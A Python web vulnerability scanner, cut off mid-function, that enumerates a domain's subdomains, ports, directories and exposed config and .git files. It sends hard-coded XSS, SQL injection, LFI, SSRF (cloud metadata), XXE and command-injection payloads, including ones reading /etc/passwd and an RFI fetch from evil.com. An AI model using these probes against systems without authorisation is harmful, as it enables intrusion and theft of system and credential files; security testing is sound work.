import socket
import ssl
import requests
import subprocess
import dns.resolver
from datetime import datetime
import concurrent.futures
import json
import urllib.parse
import re
import os
import sys
import random
import string
import threading
import time
import hashlib
import base64
import urllib3

try:
    import nmap
except ImportError:
    print("[-] python-nmap не установлен. Установите: pip install python-nmap")
    nmap = None

try:
    import whois
except ImportError:
    print("[-] python-whois не установлен. Установите: pip install python-whois")
    whois = None

try:
    from colorama import init, Fore, Style

    init(autoreset=True)
except ImportError:
    print("[-] colorama не установлен. Установите: pip install colorama")


    class Fore:
        RED = ''
        GREEN = ''
        YELLOW = ''
        CYAN = ''
        RESET = ''


    Style = type('Style', (), {'RESET_ALL': ''})()

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("[-] beautifulsoup4 не установлен. Установите: pip install beautifulsoup4")
    BeautifulSoup = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class UltimateSecurityAnalyzer:
    def __init__(self, domain):
        self.domain = domain
        self.results = {
            'domain': domain,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'critical_vulns': [],
            'ports': [],
            'services': [],
            'subdomains': [],
            'directories': [],
            'endpoints': [],
            'headers_issues': [],
            'cms_detected': None,
            'technologies': [],
            'security_score': 100
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.xss_payloads = []
        self.sqli_payloads = []
        self.lfi_payloads = []
        self.rfi_payloads = []
        self.ssrf_payloads = []
        self.xxe_payloads = []
        self.command_injection_payloads = []
        self.load_payloads()

    def load_payloads(self):
        self.xss_payloads = [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<iframe src="javascript:alert(`xss`)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            'javascript:alert(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
        ]

        self.sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "'; EXEC xp_cmdshell('dir')--",
            "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES)--",
            "' OR 1=1--",
            "' AND SLEEP(5)--"
        ]

        self.lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "../../../../windows/win.ini",
            "file:///etc/passwd",
            "/etc/passwd",
            "../../../../../../etc/passwd",
            "/proc/self/environ"
        ]

        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://localhost:25/_HELO%20localhost"
        ]

        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ]

        self.command_injection_payloads = [
            ";id",
            "|id",
            "||id",
            "&id",
            "&&id",
            "`id`",
            "$(id)",
            ";cat /etc/passwd",
            ";whoami",
            ";uname -a"
        ]

    def print_banner(self, title):
        print(f"\n{Fore.CYAN}{'=' * 80}")
        print(f"{Fore.YELLOW}{title}")
        print(f"{Fore.CYAN}{'=' * 80}{Fore.RESET}")

    def check_dns(self):
        self.print_banner("DNS ANALYSIS")
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1']

            records = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
            for record_type in records:
                try:
                    answers = resolver.resolve(self.domain, record_type)
                    print(f"{Fore.GREEN}[+] {record_type}:")
                    for rdata in answers:
                        print(f"    {rdata}")
                except:
                    pass

            self.bruteforce_subdomains()

        except Exception as e:
            print(f"{Fore.RED}[-] DNS error: {e}")

    def bruteforce_subdomains(self):
        print(f"\n{Fore.YELLOW}[*] Bruteforcing subdomains...")
        wordlist = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api',
            'secure', 'blog', 'shop', 'portal', 'webmail', 'ns1', 'ns2',
            'vpn', 'git', 'jenkins', 'docker', 'monitor', 'app', 'mobile',
            'beta', 'backup', 'temp', 'test1', 'stage', 'web', 'login',
            'dashboard', 'panel', 'server', 'support', 'help', 'forum',
            'chat', 'news', 'video', 'music', 'radio', 'shop', 'store',
            'payment', 'account', 'user', 'profile', 'search', 'sitemap',
            'robots', 'git', 'svn', 'cgi-bin', 'admin', 'administrator'
        ]

        found_subs = []

        def check_sub(sub):
            try:
                ip = socket.gethostbyname(f"{sub}.{self.domain}")
                print(f"{Fore.GREEN}[+] {sub}.{self.domain} -> {ip}")
                found_subs.append(f"{sub}.{self.domain}")
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_sub, wordlist)

        if found_subs:
            self.results['subdomains'] = found_subs
            print(f"{Fore.GREEN}[+] Found {len(found_subs)} subdomains")
        else:
            print(f"{Fore.RED}[-] No subdomains found")

    def check_http_https(self):
        self.print_banner("HTTP/HTTPS ANALYSIS")

        targets = [
            f"http://{self.domain}",
            f"https://{self.domain}",
            f"http://www.{self.domain}",
            f"https://www.{self.domain}"
        ]

        for url in targets:
            try:
                response = self.session.get(url, timeout=10, verify=False)
                print(f"{Fore.GREEN}[+] {url} - {response.status_code}")

                if response.history:
                    for resp in response.history:
                        print(f"{Fore.YELLOW}[→] Redirect: {resp.status_code} -> {resp.url}")

                self.analyze_response(url, response)

            except requests.exceptions.SSLError as e:
                print(f"{Fore.RED}[-] {url} - SSL Error: {e}")
                self.results['vulnerabilities'].append(f"SSL Error: {e}")
                self.results['security_score'] -= 20
            except Exception as e:
                print(f"{Fore.RED}[-] {url} - Unavailable: {e}")

    def analyze_response(self, url, response):
        self.check_headers_security(response.headers)
        self.check_cms(response.text, response.headers)
        self.check_technologies(response.headers, response.text)
        self.extract_endpoints(response.text, url)

        if response.status_code == 200:
            self.advanced_xss_scan(url, response.text)
            self.advanced_sqli_scan(url, response.text)
            self.advanced_lfi_scan(url)
            self.advanced_ssrf_scan(url)
            self.command_injection_scan(url)
            self.check_crlf_injection(url)
            self.check_open_redirect(url)

    def check_headers_security(self, headers):
        print(f"\n{Fore.YELLOW}[*] Security Headers Check:")

        security_checks = {
            'Strict-Transport-Security': {
                'check': lambda h: 'Strict-Transport-Security' in h,
                'message': 'HSTS not configured',
                'penalty': 15
            },
            'Content-Security-Policy': {
                'check': lambda h: 'Content-Security-Policy' in h,
                'message': 'CSP not configured',
                'penalty': 10
            },
            'X-Frame-Options': {
                'check': lambda h: 'X-Frame-Options' in h,
                'message': 'Clickjacking protection missing',
                'penalty': 10
            },
            'X-Content-Type-Options': {
                'check': lambda h: 'X-Content-Type-Options' in h,
                'message': 'MIME-sniffing not blocked',
                'penalty': 5
            },
            'X-XSS-Protection': {
                'check': lambda h: 'X-XSS-Protection' in h and '1; mode=block' in h['X-XSS-Protection'],
                'message': 'XSS protection weak or missing',
                'penalty': 10
            },
            'Referrer-Policy': {
                'check': lambda h: 'Referrer-Policy' in h and h['Referrer-Policy'] in ['no-referrer', 'strict-origin',
                                                                                       'strict-origin-when-cross-origin'],
                'message': 'Referrer policy weak or missing',
                'penalty': 5
            }
        }

        for header, check_info in security_checks.items():
            if check_info['check'](headers):
                print(f"{Fore.GREEN}    [+] {header}: OK")
            else:
                print(f"{Fore.RED}    [-] {check_info['message']}")
                self.results['headers_issues'].append(check_info['message'])
                self.results['security_score'] -= check_info['penalty']

    def check_cms(self, content, headers):
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress', '/wp-admin/', 'xmlrpc.php'],
            'Joomla': ['joomla', '/media/system/', '/administrator/', 'index.php?option='],
            'Drupal': ['drupal', '/sites/all/', '/modules/', '?q=user/password'],
            'Magento': ['magento', '/skin/frontend/', '/media/'],
            'Shopify': ['shopify', 'cdn.shopify.com']
        }

        for cms, indicators in cms_indicators.items():
            for indicator in indicators:
                if indicator.lower() in content.lower() or (
                        headers.get('Server') and indicator.lower() in headers['Server'].lower()) or (
                        headers.get('X-Powered-By') and indicator.lower() in headers['X-Powered-By'].lower()):
                    print(f"{Fore.YELLOW}[*] Detected CMS/Technology: {cms}")
                    self.results['cms_detected'] = cms
                    self.results['technologies'].append(cms)

                    if cms in ['WordPress', 'Joomla', 'Drupal']:
                        self.check_cms_vulnerabilities(cms)
                    return

    def check_technologies(self, headers, content):
        tech_patterns = {
            'JavaScript Frameworks': ['react', 'angular', 'vue', 'jquery'],
            'CSS Frameworks': ['bootstrap', 'foundation'],
            'Web Servers': ['nginx', 'apache', 'iis'],
            'Programming Languages': ['php', 'python', 'ruby', 'java', 'asp'],
            'Databases': ['mysql', 'postgresql', 'mongodb', 'redis']
        }

        detected = []
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in content.lower() or (
                        headers.get('X-Powered-By') and pattern in headers['X-Powered-By'].lower()):
                    detected.append(pattern)

        if detected:
            print(f"{Fore.YELLOW}[*] Technologies: {', '.join(set(detected))}")
            self.results['technologies'].extend(list(set(detected)))

    def extract_endpoints(self, content, base_url):
        endpoints = set()

        patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                if match and not match.startswith(('http://', 'https://', '//', 'mailto:', 'tel:', '#')):
                    if match.startswith('/'):
                        endpoints.add(f"{base_url.rstrip('/')}{match}")
                    else:
                        endpoints.add(f"{base_url.rstrip('/')}/{match}")

        if endpoints:
            print(f"{Fore.YELLOW}[*] Found {len(endpoints)} endpoints")
            self.results['endpoints'] = list(endpoints)
            for endpoint in list(endpoints)[:5]:
                print(f"{Fore.CYAN}    {endpoint}")

    def check_cms_vulnerabilities(self, cms):
        print(f"{Fore.YELLOW}[*] Checking {cms} vulnerabilities...")

        if cms == 'WordPress':
            wp_urls = [
                f"http://{self.domain}/wp-admin/",
                f"http://{self.domain}/wp-login.php",
                f"http://{self.domain}/xmlrpc.php",
                f"http://{self.domain}/readme.html"
            ]

            for url in wp_urls:
                try:
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        print(f"{Fore.RED}[-] {url} is accessible")
                        self.results['vulnerabilities'].append(f"WordPress {url.split('/')[-1]} accessible")
                        self.results['security_score'] -= 10
                except:
                    pass

    def advanced_xss_scan(self, url, content):
        print(f"{Fore.YELLOW}[*] Advanced XSS Scanning...")

        vulnerable = False

        if '?' in url:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for param_name, param_values in params.items():
                for payload in self.xss_payloads[:3]:
                    test_url = url.replace(param_values[0], payload)
                    try:
                        response = self.session.get(test_url, timeout=5, verify=False)
                        if payload in response.text:
                            print(f"{Fore.RED}[!] XSS possible in parameter: {param_name}")
                            vulnerable = True
                            self.results['critical_vulns'].append(f"XSS in {param_name}")
                            self.results['security_score'] -= 25
                    except:
                        pass

        if not vulnerable:
            print(f"{Fore.GREEN}[+] No obvious XSS vulnerabilities found")

    def advanced_sqli_scan(self, url, content):
        print(f"{Fore.YELLOW}[*] Advanced SQL Injection Scanning...")

        vulnerable = False
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"ORA-\d{5}",
            r"Microsoft SQL Server",
            r"Unclosed quotation mark"
        ]

        if '?' in url:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for param_name, param_values in params.items():
                for payload in self.sqli_payloads[:3]:
                    test_url = url.replace(param_values[0], payload)
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        content_lower = response.text.lower()

                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                print(f"{Fore.RED}[!] SQL Injection possible in parameter: {param_name}")
                                vulnerable = True
                                self.results['critical_vulns'].append(f"SQLi in {param_name}")
                                self.results['security_score'] -= 30
                                break
                    except:
                        pass

        if not vulnerable:
            print(f"{Fore.GREEN}[+] No obvious SQL Injection vulnerabilities found")

    def advanced_lfi_scan(self, url):
        print(f"{Fore.YELLOW}[*] Advanced LFI/RFI Scanning...")

        vulnerable = False

        for payload in self.lfi_payloads[:3]:
            test_url = f"{url}?file={payload}"
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                if 'root:' in response.text or '[fonts]' in response.text:
                    print(f"{Fore.RED}[!] LFI possible: {payload}")
                    vulnerable = True
                    self.results['critical_vulns'].append("Local File Inclusion")
                    self.results['security_score'] -= 25
            except:
                pass

        if not vulnerable:
            print(f"{Fore.GREEN}[+] No obvious LFI/RFI vulnerabilities found")

    def advanced_ssrf_scan(self, url):
        print(f"{Fore.YELLOW}[*] Advanced SSRF Scanning...")

        vulnerable = False

        for payload in self.ssrf_payloads[:3]:
            test_url = f"{url}?url={payload}"
            try:
                response = self.session.get(test_url, timeout=3, verify=False)
                if 'root:' in response.text or 'aws' in response.text.lower():
                    print(f"{Fore.RED}[!] SSRF possible: {payload}")
                    vulnerable = True
                    self.results['critical_vulns'].append("Server-Side Request Forgery")
                    self.results['security_score'] -= 20
            except:
                pass

        if not vulnerable:
            print(f"{Fore.GREEN}[+] No obvious SSRF vulnerabilities found")

    def command_injection_scan(self, url):
        print(f"{Fore.YELLOW}[*] Command Injection Scanning...")

        vulnerable = False

        if '?' in url:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for param_name, param_values in params.items():
                for payload in self.command_injection_payloads[:3]:
                    test_url = url.replace(param_values[0], payload)
                    try:
                        time_before = time.time()
                        response = self.session.get(test_url, timeout=10, verify=False)

                        if time.time() - time_before > 4:
                            print(f"{Fore.RED}[!] Time-based command injection possible in: {param_name}")
                            vulnerable = True
                            self.results['critical_vulns'].append(f"Command injection in {param_name}")
                            self.results['security_score'] -= 25

                        if 'uid=' in response.text or 'gid=' in response.text:
                            print(f"{Fore.RED}[!] Command injection possible in: {param_name}")
                            vulnerable = True
                            self.results['critical_vulns'].append(f"Command injection in {param_name}")
                            self.results['security_score'] -= 25

                    except Exception as e:
                        pass

        if not vulnerable:
            print(f"{Fore.GREEN}[+] No obvious command injection vulnerabilities found")

    def check_crlf_injection(self, url):
        print(f"{Fore.YELLOW}[*] CRLF Injection Scanning...")

        crlf_payloads = [
            '%0d%0aSet-Cookie:injected=true',
            '%0d%0aX-Injected:true'
        ]

        for payload in crlf_payloads:
            test_url = f"{url}?param={payload}"
            try:
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                headers = str(response.headers).lower()
                if 'injected' in headers:
                    print(f"{Fore.RED}[!] CRLF Injection possible")
                    self.results['vulnerabilities'].append("CRLF Injection")
                    self.results['security_score'] -= 15
                    return
            except:
                pass

        print(f"{Fore.GREEN}[+] No CRLF injection vulnerabilities found")

    def check_open_redirect(self, url):
        print(f"{Fore.YELLOW}[*] Open Redirect Scanning...")

        redirect_payloads = [
            'https://evil.com',
            '//evil.com'
        ]

        for payload in redirect_payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=True)
                if 'evil.com' in response.url:
                    print(f"{Fore.RED}[!] Open Redirect possible")
                    self.results['vulnerabilities'].append("Open Redirect")
                    self.results['security_score'] -= 10
                    return
            except:
                pass

        print(f"{Fore.GREEN}[+] No open redirect vulnerabilities found")

    def check_ssl_certificate(self):
        self.print_banner("SSL/TLS ANALYSIS")

        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()

                    print(f"{Fore.GREEN}[+] Certificate found")

                    not_after = cert['notAfter']
                    not_before = cert['notBefore']
                    expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_left = (expiry_date - datetime.now()).days

                    print(f"{Fore.GREEN}[+] Valid from: {not_before}")
                    print(f"{Fore.GREEN}[+] Valid until: {not_after}")
                    print(f"{Fore.GREEN}[+] Days remaining: {days_left}")

                    if days_left < 30:
                        print(f"{Fore.RED}[!] WARNING: Certificate expires soon!")
                        self.results['vulnerabilities'].append("SSL certificate expires soon")
                        self.results['security_score'] -= 20

                    if days_left < 0:
                        print(f"{Fore.RED}[!] CRITICAL: Certificate expired!")
                        self.results['critical_vulns'].append("SSL certificate expired")
                        self.results['security_score'] -= 40

                    cipher = ssock.cipher()
                    print(f"{Fore.GREEN}[+] Cipher: {cipher[0]} {cipher[1]} {cipher[2]}")

                    if 'RC4' in cipher[0] or 'DES' in cipher[0] or '3DES' in cipher[0]:
                        print(f"{Fore.RED}[!] Weak cipher detected: {cipher[0]}")
                        self.results['vulnerabilities'].append(f"Weak cipher: {cipher[0]}")
                        self.results['security_score'] -= 15

                    tls_version = ssock.version()
                    print(f"{Fore.GREEN}[+] TLS Version: {tls_version}")

                    if tls_version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.0']:
                        print(f"{Fore.RED}[!] Weak TLS version: {tls_version}")
                        self.results['vulnerabilities'].append(f"Weak TLS version: {tls_version}")
                        self.results['security_score'] -= 20

        except Exception as e:
            print(f"{Fore.RED}[-] SSL check failed: {e}")
            self.results['vulnerabilities'].append(f"SSL check failed: {e}")
            self.results['security_score'] -= 30

    def full_port_scan(self):
        self.print_banner("FULL PORT SCAN")

        if nmap is None:
            print(f"{Fore.RED}[-] python-nmap not installed. Skipping port scan.")
            print(f"{Fore.YELLOW}[*] Install with: pip install python-nmap")
            self.quick_port_scan()
            return

        try:
            nm = nmap.PortScanner()

            print(f"{Fore.YELLOW}[*] Starting port scan...")

            nm.scan(self.domain, arguments='-p 1-1000 -T4 -sV')

            if self.domain in nm.all_hosts():
                host = nm[self.domain]

                print(f"{Fore.GREEN}[+] Host status: {host.state()}")

                protocols = ['tcp', 'udp']
                for proto in protocols:
                    if proto in host:
                        print(f"\n{Fore.CYAN}[*] {proto.upper()} PORTS:")
                        for port in sorted(host[proto].keys()):
                            port_info = host[proto][port]
                            state = port_info['state']

                            if state == 'open':
                                status = f"{Fore.GREEN}[+] Port {port}: {port_info['name']} - OPEN"
                                print(status)

                                service_info = f"Service: {port_info.get('product', '')} {port_info.get('version', '')}"
                                if service_info.strip():
                                    print(f"    {Fore.YELLOW}{service_info}")

                                self.results['ports'].append({
                                    'port': port,
                                    'protocol': proto,
                                    'state': state,
                                    'service': port_info['name'],
                                    'product': port_info.get('product', ''),
                                    'version': port_info.get('version', '')
                                })

                                self.results['services'].append({
                                    'port': port,
                                    'name': port_info['name'],
                                    'product': port_info.get('product', '')
                                })

            else:
                print(f"{Fore.RED}[-] Host not found or unreachable")

        except Exception as e:
            print(f"{Fore.RED}[-] Port scan error: {e}")
            self.quick_port_scan()

    def quick_port_scan(self):
        print(f"{Fore.YELLOW}[*] Quick port scan...")

        top_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
            993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000,
            27017, 5000, 5432, 6379, 9200, 11211
        ]

        open_ports = []

        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.domain, port))
                sock.close()

                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = 'unknown'

                    print(f"{Fore.GREEN}[+] Port {port} ({service}) - OPEN")
                    open_ports.append((port, service))

                    self.results['ports'].append({
                        'port': port,
                        'protocol': 'tcp',
                        'state': 'open',
                        'service': service
                    })
                else:
                    print(f"{Fore.RED}[-] Port {port} - CLOSED")
            except:
                print(f"{Fore.RED}[-] Port {port} - ERROR")

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_port, top_ports)

        return open_ports

    def check_whois(self):
        self.print_banner("WHOIS INFORMATION")

        if whois is None:
            print(f"{Fore.RED}[-] python-whois not installed. Skipping WHOIS.")
            print(f"{Fore.YELLOW}[*] Install with: pip install python-whois")
            return

        try:
            w = whois.whois(self.domain)

            if w.domain_name:
                print(f"{Fore.GREEN}[+] Domain: {w.domain_name}")

            if w.registrar:
                print(f"{Fore.GREEN}[+] Registrar: {w.registrar}")

            if w.creation_date:
                print(f"{Fore.GREEN}[+] Created: {w.creation_date}")

            if w.expiration_date:
                expiry_date = w.expiration_date
                if isinstance(expiry_date, list):
                    expiry_date = expiry_date[0]

                print(f"{Fore.GREEN}[+] Expires: {expiry_date}")

                if isinstance(expiry_date, datetime):
                    days_left = (expiry_date - datetime.now()).days
                    print(f"{Fore.GREEN}[+] Days until expiry: {days_left}")

                    if days_left < 30:
                        print(f"{Fore.RED}[!] Domain expires soon!")
                        self.results['vulnerabilities'].append("Domain expires soon")
                        self.results['security_score'] -= 10

            if w.name_servers:
                print(f"{Fore.GREEN}[+] Name servers:")
                for ns in w.name_servers[:3]:
                    print(f"    {ns}")

        except Exception as e:
            print(f"{Fore.RED}[-] WHOIS error: {e}")

    def directory_bruteforce(self):
        self.print_banner("DIRECTORY BRUTEFORCE")

        common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'wp-login',
            'dashboard', 'control', 'manager', 'private', 'secret',
            'backup', 'backups', 'old', 'new', 'temp', 'tmp', 'test',
            'api', 'api/v1', 'rest', 'graphql', 'cgi-bin',
            'includes', 'assets', 'static', 'uploads', 'downloads',
            'images', 'css', 'js', 'vendor', 'lib', 'modules',
            'plugins', 'themes', 'cache', 'session', 'oauth',
            'auth', 'register', 'signup', 'signin', 'logout',
            'password', 'reset', 'account', 'user', 'profile',
            'shop', 'store', 'cart', 'checkout', 'payment',
            'contact', 'about', 'team', 'blog', 'news', 'forum',
            'support', 'help', 'faq', 'wiki', 'docs', 'download',
            'search', 'sitemap', 'robots.txt', 'security.txt',
            '.env', '.git', '.svn', '.htaccess', '.htpasswd',
            'config.php', 'settings.php', 'web.config',
            'backup.zip', 'backup.sql', 'database.sql',
            'README.md', 'LICENSE', 'CHANGELOG'
        ]

        found_dirs = []

        def check_dir(directory):
            url = f"http://{self.domain}/{directory}"
            try:
                response = self.session.get(url, timeout=3, verify=False, allow_redirects=False)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] {url} - FOUND (200)")
                    found_dirs.append(url)
                elif response.status_code == 403:
                    print(f"{Fore.YELLOW}[!] {url} - FORBIDDEN (403)")
                elif response.status_code in [301, 302]:
                    print(f"{Fore.CYAN}[→] {url} - REDIRECT ({response.status_code})")
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_dir, common_dirs)

        if found_dirs:
            self.results['directories'] = found_dirs
            print(f"{Fore.GREEN}[+] Found {len(found_dirs)} directories")
        else:
            print(f"{Fore.RED}[-] No directories found")

    def check_vulnerabilities(self):
        self.print_banner("VULNERABILITY SCAN")

        print(f"{Fore.YELLOW}[*] Checking for common vulnerabilities...")

        self.check_http_methods()
        self.check_server_status()
        self.check_config_files()
        self.check_backup_files()
        self.check_source_code_leakage()
        self.check_cors_misconfiguration()

    def check_http_methods(self):
        print(f"{Fore.YELLOW}[*] Checking HTTP methods...")

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE']
        dangerous_methods = ['PUT', 'DELETE', 'TRACE']

        for method in methods:
            try:
                response = self.session.request(method, f"http://{self.domain}", timeout=5, verify=False)
                print(f"{Fore.CYAN}[?] {method}: {response.status_code}")

                if method in dangerous_methods and response.status_code in [200, 201, 204]:
                    print(f"{Fore.RED}[!] Dangerous method {method} allowed")
                    self.results['vulnerabilities'].append(f"Dangerous HTTP method {method} allowed")
                    self.results['security_score'] -= 10

                if method == 'TRACE' and response.status_code == 200:
                    print(f"{Fore.RED}[!] TRACE method enabled - XST possible")
                    self.results['critical_vulns'].append("TRACE method enabled (XST)")
                    self.results['security_score'] -= 15

            except:
                print(f"{Fore.RED}[-] {method}: Failed")

    def check_server_status(self):
        print(f"{Fore.YELLOW}[*] Checking server status pages...")

        status_urls = [
            f"http://{self.domain}/server-status",
            f"http://{self.domain}/status",
            f"http://{self.domain}/php-status"
        ]

        for url in status_urls:
            try:
                response = self.session.get(url, timeout=3, verify=False)
                if response.status_code == 200 and (
                        'server-status' in response.text.lower() or 'apache' in response.text.lower()):
                    print(f"{Fore.RED}[!] Server status page exposed: {url}")
                    self.results['vulnerabilities'].append("Server status page exposed")
                    self.results['security_score'] -= 10
            except:
                pass

    def check_config_files(self):
        print(f"{Fore.YELLOW}[*] Checking configuration files...")

        config_files = [
            '.env', '.env.example', '.env.local',
            'config.php', 'settings.php', 'wp-config.php',
            'config.xml', 'web.config', '.htaccess', '.htpasswd',
            'robots.txt'
        ]

        for config_file in config_files:
            url = f"http://{self.domain}/{config_file}"
            try:
                response = self.session.get(url, timeout=3, verify=False)
                if response.status_code == 200:
                    print(f"{Fore.RED}[!] Configuration file exposed: {url}")
                    self.results['vulnerabilities'].append(f"Configuration file exposed: {config_file}")
                    self.results['security_score'] -= 10

                    if '.env' in config_file or 'config.php' in config_file:
                        content = response.text[:500]
                        if 'password' in content.lower() or 'secret' in content.lower():
                            print(f"{Fore.RED}[!] CRITICAL: Secrets in config file!")
                            self.results['critical_vulns'].append(f"Secrets in config file: {config_file}")
                            self.results['security_score'] -= 25
            except:
                pass

    def check_backup_files(self):
        print(f"{Fore.YELLOW}[*] Checking backup files...")

        backup_files = [
            'backup.zip', 'backup.tar', 'backup.tar.gz',
            'backup.sql', 'database.zip', 'database.sql',
            'db.zip', 'db.sql', 'dump.zip', 'dump.sql'
        ]

        for backup_file in backup_files:
            url = f"http://{self.domain}/{backup_file}"
            try:
                response = self.session.head(url, timeout=3, verify=False)
                if response.status_code == 200:
                    print(f"{Fore.RED}[!] Backup file exposed: {url}")
                    self.results['vulnerabilities'].append(f"Backup file exposed: {backup_file}")
                    self.results['security_score'] -= 15
            except:
                pass

    def check_source_code_leakage(self):
        print(f"{Fore.YELLOW}[*] Checking source code leakage...")

        source_files = [
            '.git/HEAD', '.git/config',
            '.svn/entries', '.hg/store',
            'README.md', 'LICENSE',
            'composer.json', 'package.json'
        ]

        for source_file in source_files:
            url = f"http://{self.domain}/{source_file}"
            try:
                response = self.session.get(url, timeout=3, verify=False)
                if response.status_code == 200:
                    print(f"{Fore.RED}[!] Source code file exposed: {url}")
                    self.results['vulnerabilities'].append(f"Source code exposed: {source_file}")
                    self.results['security_score'] -= 10

                    if '.git' in source_file:
                        print(f"{Fore.RED}[!] CRITICAL: Git repository exposed!")
                        self.results['critical_vulns'].append("Git repository exposed")
                        self.results['security_score'] -= 20
            except:
                pass

    def check_cors_misconfiguration(self):
        print(f"{Fore.YELLOW}[*] Checking CORS configuration...")

        try:
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(f"http://{self.domain}", headers=headers, timeout=5, verify=False)

            if 'Access-Control-Allow-Origin' in response.headers:
                cors_header = response.headers['Access-Control-Allow-Origin']
                print(f"{Fore.CYAN}[?] CORS Header: {cors_header}")

                if cors_header == '*':
                    print(f"{Fore.RED}[!] CORS misconfigured: Wildcard origin allowed")
                    self.results['vulnerabilities'].append("CORS wildcard origin")
                    self.results['security_score'] -= 10
                elif 'Access-Control-Allow-Credentials' in response.headers and response.headers[
                    'Access-Control-Allow-Credentials'].lower() == 'true':
                    print(f"{Fore.RED}[!] CORS with credentials allowed")
                    self.results['vulnerabilities'].append("CORS with credentials")
                    self.results['security_score'] -= 15
        except:
            pass

    def save_results(self):
        filename = f"scan_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        self.results['security_score'] = max(0, self.results['security_score'])

        risk_level = "CRITICAL" if self.results['security_score'] < 30 else \
            "HIGH" if self.results['security_score'] < 50 else \
                "MEDIUM" if self.results['security_score'] < 70 else \
                    "LOW" if self.results['security_score'] < 90 else "SECURE"

        self.results['risk_level'] = risk_level

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n{Fore.GREEN}[+] Results saved to {filename}")

        txt_filename = filename.replace('.json', '.txt')
        with open(txt_filename, 'w', encoding='utf-8') as f:
            f.write(f"SECURITY SCAN REPORT\n")
            f.write(f"Target: {self.domain}\n")
            f.write(f"Scan time: {self.results['scan_time']}\n")
            f.write(f"Security Score: {self.results['security_score']}/100\n")
            f.write(f"Risk Level: {risk_level}\n")
            f.write("=" * 80 + "\n\n")

            if self.results['critical_vulns']:
                f.write("CRITICAL VULNERABILITIES:\n")
                for vuln in self.results['critical_vulns']:
                    f.write(f"  [CRITICAL] {vuln}\n")
                f.write("\n")

            if self.results['vulnerabilities']:
                f.write("VULNERABILITIES:\n")
                for vuln in self.results['vulnerabilities']:
                    f.write(f"  [-] {vuln}\n")
                f.write("\n")

            if self.results['ports']:
